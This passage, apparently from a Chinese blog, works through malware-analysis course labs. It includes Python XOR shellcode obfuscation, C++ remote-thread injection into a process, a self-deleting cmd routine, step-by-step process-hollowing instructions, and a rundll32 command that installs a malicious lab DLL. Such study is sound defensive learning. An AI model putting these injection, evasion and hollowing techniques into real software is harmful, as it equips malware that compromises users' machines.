class="code"><pre><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="string">&quot;this_is_a_key&quot;</span></span><br><span class="line">key2=<span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">    s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(shellcode[i])^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line">    s += key[(i+<span class="number">3</span>)%<span class="built_in">len</span>(key2)]</span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(<span class="string">&quot;\\x%x&quot;</span>%<span class="built_in">ord</span>(s[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>远端注入shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">798</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">buf[i]=buf[i]^<span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD pid = <span class="number">2932</span>;</span><br><span class="line">HANDLE Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (!Proc) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID buffer = VirtualAllocEx(Proc, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (buffer) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(Proc, buffer, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>) )&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE remotethread = CreateRemoteThread(Proc, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)buffer, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找exe中的资源，图片或者其他二进制文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hModule;</span><br><span class="line">HRSRC hResInfo;</span><br><span class="line">HGLOBAL hResData;</span><br><span class="line">DWORD dwSize;</span><br><span class="line">LPVOID adr;</span><br><span class="line"><span class="keyword">void</span> *Src;</span><br><span class="line"></span><br><span class="line">hModule = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">FindResourceA(hModule, <span class="string">&quot;LOCALIZATION&quot;</span>, <span class="string">&quot;UNICODE&quot;</span>);</span><br><span class="line">hResData = LoadResource(hModule, hResInfo);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( hResData )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;yes1&quot;</span>);</span><br><span class="line">    Src = LockResource(hResData);</span><br><span class="line">    <span class="keyword">if</span> ( Src )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes2&quot;</span>);</span><br><span class="line">    dwSize = SizeofResource(hModule, hResInfo);</span><br><span class="line">    <span class="keyword">if</span> ( dwSize )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes3&quot;</span>);</span><br><span class="line">    adr = VirtualAlloc(<span class="number">0</span>, dwSize, <span class="number">0x1000</span>u, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span>(adr)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(adr, Src, dwSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes4&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是否网络连接</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL flag;</span><br><span class="line">flag = InternetGetConnectedState(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Success: Internet Connection&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error 1.1: No Internet&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Lab01"><a href="#Lab01" class="headerlink" title="Lab01"></a>Lab01</h2><h3 id="Lab01-01"><a href="#Lab01-01" class="headerlink" title="Lab01-01"></a>Lab01-01</h3><p>后面会再次分析这个lab，所以这次只简单做过判断。</p><p>任务：分析lab01-01.dll，和lab01-01.exe。</p><p>看看利用petool查看编译时间，主要是用用这个工具。<br><img src="https://i.loli.net/2021/09/11/qdHfOnJYj4mVzKl.png"><br>然后用Eexinfo PE来看看，发现没有加壳。</p><p>ida看看，可以看到对lab01-01.dll，和C:\windows\system32\kernel32.dll进行了操作。<br><img src="https://i.loli.net/2021/09/13/4roWCLh7GyNIcAi.png"><br>然后向下看看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>) )<span class="comment">// Lab01-01.dll   C:\windows\system32\kerne132.dll</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">sub_4011E0(aC, <span class="number">0</span>);                          <span class="comment">// C:\*</span></span><br></pre></td></tr></table></figure><p>可以看到将lab01-01.dll复制到了C:\windows\system32\kerne132.dll，注意是kerne132.dll不是kernel32.dll。然后进行了sub_4011E0。</p><p>来看看sub_4011E0函数，可以看出就是常用的递归遍历c盘的所有文件。<br><img src="https://i.loli.net/2021/09/13/wNEF9iHyMU6q37h.png"><br>基本代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listFiles</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dir)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dir[<span class="number">100</span>]=<span class="string">&quot;D:\\a&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    listFiles(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listFiles</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    WIN32_FIND_DATA findData;</span><br><span class="line">    LARGE_INTEGER size;</span><br><span class="line">    <span class="keyword">char</span> dirNew[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向目录加通配符，用于搜索第一个文件 </span></span><br><span class="line">    <span class="built_in">strcpy</span>(dirNew, dir);</span><br><span class="line">    <span class="built_in">strcat</span>(dirNew, <span class="string">&quot;\\*.*&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hFind = FindFirstFile(dirNew, &amp;findData);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 是否是文件夹，</span></span><br><span class="line">        <span class="keyword">if</span>(findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//并且名称不为&quot;.&quot;或&quot;..&quot;  </span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(findData.cFileName,<span class="string">&quot;.&quot;</span>)!=<span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(findData.cFileName, <span class="string">&quot;..&quot;</span>)!=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将dirNew设置为搜索到的目录，并进行下一轮搜索 </span></span><br><span class="line">            <span class="keyword">char</span> dirNew1[<span class="number">100</span>];</span><br><span class="line">            <span class="built_in">strcpy</span>(dirNew1, dir);</span><br><span class="line">            <span class="built_in">strcat</span>(dirNew1, <span class="string">&quot;\\&quot;</span>);</span><br><span class="line">            <span class="built_in">strcat</span>(dirNew1, findData.cFileName);</span><br><span class="line">            listFiles(dirNew1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcpy</span>(findData.cFileName,<span class="string">&quot;test1.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,dirNew);</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FindNextFile(hFind, &amp;findData));</span><br><span class="line"></span><br><span class="line">    FindClose(hFind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入sub_4010A0，可以看出用CreateFileMappingA映射了找到的exe文件，并匹配kernel32.dll字符串，修改为kerne132.dll。</p><p>分析lab01-01.dll</p><p>可以看到，创建了互斥体来保证只会有一个进程来运行这个dll，还有网络进程通信，和连接ip，默认80端口，seed发送信息，CreateProcessA创建进程等操作，估计是个后门函数。</p><h3 id="Lab01-02"><a href="#Lab01-02" class="headerlink" title="Lab01-02"></a>Lab01-02</h3><p>一个加壳程序，upx -d脱壳后，会发现StartServiceCtrlDispatcherA()函数，将服务进程的主线程连接到服务控制管理器，我们来看看ServiceMain函数。</p><p><img src="https://i.loli.net/2021/09/15/icyvdjBLtKmT2sF.png"><br>所以这个程序就是创建了一个服务，然后访问了<a href="http://www.malwareanalysisbook.com这个网站,可以通过监视网络流量检查被恶意代码感染的主机./">http://www.malwareanalysisbook.com这个网站，可以通过监视网络流量检查被恶意代码感染的主机。</a></p><h3 id="Lab01-03"><a href="#Lab01-03" class="headerlink" title="Lab01-03"></a>Lab01-03</h3><p>peid打开发现有FSG壳，还没见过这个壳，虽然会手动脱壳，还是跟着书来，后面再来分析这个吧。</p><h3 id="Lab01-04"><a href="#Lab01-04" class="headerlink" title="Lab01-04"></a>Lab01-04</h3><p>这个样本就挺有意思的，书上是在Lab1简单讲了一下，在Lab12中更细致的分析了，可以从中学到很多知识，现在从头到尾来分析下这个恶意代码。</p><p>先来看看main函数<br><img src="https://i.loli.net/2021/09/15/6bjsDCh58iHSzJT.png"><br>然后我们来看看这个程序遍历PID干嘛，sub_401000()函数。<br><img src="https://i.loli.net/2021/09/15/hqOes31HgEVJiPc.png"><br>为什么需要找到winlogon.exe这个进程的PID呢，下一个函数就会告诉。</p><p>现在来看sub_401174()函数，刚开始看并不懂里面的意思，只知道是向winlogon.exe远端注入了一个线程函数，后来看了书才彻底明白。<br><img src="https://i.loli.net/2021/09/15/HG9K4X8zuvpn2Qi.png"><br>接下来估计也就会去修改文件了，来到sub_4011FC()。<br><img src="https://i.loli.net/2021/09/15/aWydVcQJw1zHoSP.png"><br>到这里，本exe流程就分析完了，接下来分析exe中的pe文件，看看究竟写入了什么东西，用Resource_Hacker dump出该pe分析。<br><img src="https://i.loli.net/2021/09/15/43B9xkbZzheSRPo.png"><br>有空，打算照着写写远端注入winlogon.exe的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Lab03"><a href="#Lab03" class="headerlink" title="Lab03"></a>Lab03</h2><p>本章一些工具的使用方法：<a href="https://zhuanlan.zhihu.com/p/24923630">https://zhuanlan.zhihu.com/p/24923630</a></p><h3 id="Lab03-01"><a href="#Lab03-01" class="headerlink" title="Lab03-01"></a>Lab03-01</h3><p>这个样本就是用来使用熟悉一些工具的使用的。</p><p>样本应该被加了壳。<br><img src="https://i.loli.net/2021/09/22/qIonPFKXaCJ7Egc.png"><br>先看看字符串。</p><p>先用process monitor看看，过滤writefile，和regsetvalue。<br><img src="https://i.loli.net/2021/09/22/9XokxcZSViPAmpE.png"><br>可以看到修改了注册表，并且向c:windows\system32\vmx32to64.exe写入了文件。</p><p>然后用md5deep.exe，去看两个文件是否一样。<br><img src="https://i.loli.net/2021/09/22/TUwibLJn7oEHZqF.png"><br>可以看到是一样的，所以可以判断该程序将自己复制到了c:windows\system32\vmx32to64.exe。<br>继续用Process Explorer<br><img src="https://i.loli.net/2021/09/22/HFezVbs6Gi8utxk.png"><br>创建了互斥锁，可能调用了一些联网函数。</p><p>然后用ApateDNS 以查看恶意软件是否执行了任何 DNS 请求。先配网络<a href="https://www.cnblogs.com/ha2ha2/p/9563016.html">https://www.cnblogs.com/ha2ha2/p/9563016.html</a>，windows xp没下载到合适的ApateDNS，然后用windows 10 来弄，发现并没有出现书上的内容，后面再来搞。</p><p>然后用nc监听常用80和443端口，也没出现书中内容。。。只不过还是学到了很多东西。</p><h3 id="Lab03-02-dll"><a href="#Lab03-02-dll" class="headerlink" title="Lab03-02.dll"></a>Lab03-02.dll</h3><p>利用pe view或studype+看导出函数，用ida查看可以发现这个dll的导出函数Install安装了服务，并且有修改了注册表的操作。<br><img src="https://i.loli.net/2021/09/24/WfhtRmqz1GAeEXc.png"><br>我们来用Regshot记录快照，然后对比。拍摄好第一个快照后，执行命令来安装恶意dll</p><pre><code>C:\&gt;rundll32.exe Lab03-02.dll,installA</code></pre><p>然后拍摄第二个快照。<br><img src="https://i.loli.net/2021/09/24/i2twPMIOFao451h.png"><br>然后用下面命令来启动服务。</p><pre><code>C:\&gt;net start IPRIP</code></pre><p>利用Process Explorer查看svchost.exe进程<br><img src="https://i.loli.net/2021/09/24/kUFifyTE2rl3SuH.png"><br>接下来就是网络分析了，我们在字符串中可以看到HTTP/1.1，所以很大可能是有联网过程的。</p><p>ApateDNS，配环境中。</p><h3 id="Lab03-03"><a href="#Lab03-03" class="headerlink" title="Lab03-03"></a>Lab03-03</h3><p>这个样本比较有意思，利用了pe映像切换技术，《逆向工程核心原理》有详细例子，最近也是上课看书，偶然看到这部分，书上的例子确实比较好。</p><p>我们首先来康康什么是pe映像。</p><p>我们都知道创建一个进程时，操作系统会为该进程分配一个 4GB 大小的虚拟 进程地址空间。pe映像就是pe文件在进程内存中的映射形态。<br><img src="https://i.loli.net/2021/09/28/RdGK1c9WrCEhZHm.png"><br>并且pe文件和pe映像在形态上也不会是完全相同的，会有一些差别，如下。<br><img src="https://i.loli.net/2021/09/29/iqOH9dfRL3KjaUT.png"></p><p>那么什么是pe映像切换呢，简单来说，假设现在有A，B，setup三个exe文件，我们会使用setup.exe来创建A进程，按道理本该执行A进程，但是却使用pe映像切换技术来达到运行B进程的目的。</p><p>下面来大概总结其步骤，是setup.exe的代码步骤。</p><ul><li>将B.exe这个文件存放到开辟的某个内存空间，利用createfile，VirtualAlloc函数，或者其他类似作用的函数。</li></ul><ol><li>以挂起模式创建A进程。</li><li>利用GetThreadContext函数获得A进程的主线程的上下文结构，得到CONTEXT.Eax，ReadProcessMemory函数读取PEB.image，也就是A进程的image base和EP。</li><li>调用NtUnmapViewOfSection函数卸载A进程的pe映像，防止将B.exe文件映射到该地址时发生冲突(实际上，若image base不相同，可以不卸载)。</li><li>利用VirtualAllocEx函数在A进程中以B进程的image base地址申请其size of image大小的空间。</li><li>映射pe文件头</li><li>for循环映射pe节区</li><li>调用WriteProcessMemory将A进程的PEB.imagebase修改为B进程的image base。</li><li>将EP(CONTEXT.Eax)修改为B.exe的EP。</li><li>调用ResumeThread，恢复运行A进程，但是实际上运行的是B进程。</li></ol><p>在看完本lab和《逆向工程核心原理》中的例子后，产生了两个问题</p><ul><li>上面的步骤中，修改image base这一操作的先后顺序是否有影响呢？我认为是没有影响的，因为无论哪种方式，都可以达到在A进程中为B进程的PE映像分配了内存空间，并且将A进程的PEB.imagebase修改为B进程的image base的目的。</li><li>为什么对于映射pe文件头，映射pe节区需要分开来？其实也很简单，答案就在上面的图片中，pe文件和pe映像在形态上不会是完全相同的。<br><img src="https://i.loli.net/2021/09/29/2FbNyWXaC9MrTL7.png"><br>到这里，pe映像切换的原理差不多就讲完了，感兴趣可以去看看书中的详细讲解，下面来分析恶意样本，与书中例子有小差别，但大体原理一致。</li></ul><p>先看看行为吧，可以看到创建了一个进程，并且退出了。<br><img src="https://i.loli.net/2021/09/28/QXgkwtCRKa74edz.png"></p><p>查壳，无壳，先拖进ida静态分析分析。</p><p>main函数<br><img src="https://i.loli.net/2021/09/29/ZBr7UoTMIKWQJA3.png"><br>sub_40132C函数<br><img src="https://i.loli.net/2021/09/29/CVlFzNgaDjn6WKc.png"><br>我们后面在来解密这个文件，并分析它。</p><p>sub_4010EA函数，这个函数的参数有两个，一个是C:\Windows\System32\svchost.exe，用来创建进程，一个是申请的空间地址，保存着解密后的资源文件。<br><img src="https://i.loli.net/2021/09/29/vc7QT9hEKt8blsx.png"><br>利用resource hacker dmup出资源文件，然后解密，现在来分析解密后的资源文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   FILE *p;</span><br><span class="line">    <span class="keyword">char</span> v[<span class="number">0x5FE0</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    p=fopen(<span class="string">&quot;abc.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(&amp;v, <span class="number">1</span>, <span class="number">0x5FE0</span>, p);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0x5FE0</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v[i]=v[i]^<span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *p1 = fopen(<span class="string">&quot;def.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(&amp;v, <span class="number">1</span>, <span class="number">0x5FE0</span>, p1);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先看main函数</p><p><img src="https://i.loli.net/2021/09/29/q7ExPGXJaQLRh8n.png"></p><p>fn函数<br><img src="https://i.loli.net/2021/09/29/RUDmvgzOqoSMiux.png"><br>sub_4010C7函数<br><img src="https://i.loli.net/2021/09/29/I9RzjGKvlbB5ahf.png"><br>效果如下<br><img src="https://i.loli.net/2021/09/29/D4VTmpSGZwc2qOx.png"></p><h3 id="Lab03-04"><a href="#Lab03-04" class="headerlink" title="Lab03-04"></a>Lab03-04</h3><p>一个自删除的程序，并且会按照main参数来执行相关代码，按照书上的流程，第9章在具体分析。</p><p>自删除代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR Filename[<span class="number">260</span>];</span><br><span class="line">CHAR Parameters[<span class="number">260</span>];</span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">GetShortPathNameA(Filename, Filename, <span class="number">0x104</span>u);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, Filename);</span><br><span class="line"><span class="built_in">strcpy</span>(Parameters, <span class="string">&quot;/c del &quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(Parameters, Filename);</span><br><span class="line"><span class="built_in">strcat</span>(Parameters, <span class="string">&quot; &gt;&gt; NUL&quot;</span>);</span><br><span class="line">ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cmd.exe&quot;</span>, Parameters, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Lab05"><a href="#Lab05" class="headerlink" title="Lab05"></a>Lab05</h2><h3 id="Lab05-01-dll-amp-amp-Lab05-01-py"><a href="#Lab05-01-dll-amp-amp-Lab05-01-py" class="headerlink" title="Lab05-01.dll &amp;&amp; Lab05-01.py"></a>Lab05-01.dll &amp;&amp; Lab05-01.py</h3><p>一些ida的快捷键使用，以及简单idapython的使用，跳过。</p><h2 id="Lab06"><a href="#Lab06" class="headerlink" title="Lab06"></a>Lab06</h2><h3 id="Lab06-01-exe"><a href="#Lab06-01-exe" class="headerlink" title="Lab06-01.exe"></a>Lab06-01.exe</h3><p>一个简单的判断是否有网络连接的程序。</p><p><img src="https://i.loli.net/2021/10/08/zJb7pHmRuI9gkfN.png"></p><p>可以看到使用了InternetGetConnectedState这个函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//检索本地系统的连接状态。</span></span><br><span class="line"><span 